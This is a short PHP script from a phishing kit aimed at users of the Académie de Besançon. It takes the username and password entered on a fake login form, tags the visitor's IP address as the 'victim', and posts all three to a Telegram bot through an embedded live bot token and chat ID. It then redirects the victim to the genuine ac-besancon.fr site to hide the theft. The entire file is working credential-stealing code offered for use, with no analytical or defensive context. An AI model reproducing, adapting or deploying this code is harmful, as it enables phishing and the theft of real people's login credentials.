 <?php

  $email=htmlspecialchars($_POST['user']);
  $password=htmlspecialchars($_POST['pass']);;
  $ip=$_SERVER['REMOTE_ADDR'];
   $message="----AC BESACON-----------\r\n";
   $message .="IP VICTIME :".$_SERVER['REMOTE_ADDR']."\r\n";
   $message .="Nom utilisateur :".$email."\r\n";
   $message .="Mot de passe :".$password."\r\n";
  $website="https://api.telegram.org/bot6737841709:AAH0KO7_rXOGZkNqfFTYb6LBa4BPCUlGD8I";
  $params=[
      'chat_id'=>"6754955805",
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  ?>
  <script>
      window.location.href="https://www.ac-besancon.fr/";
  </script>
  <?php
  
   ?>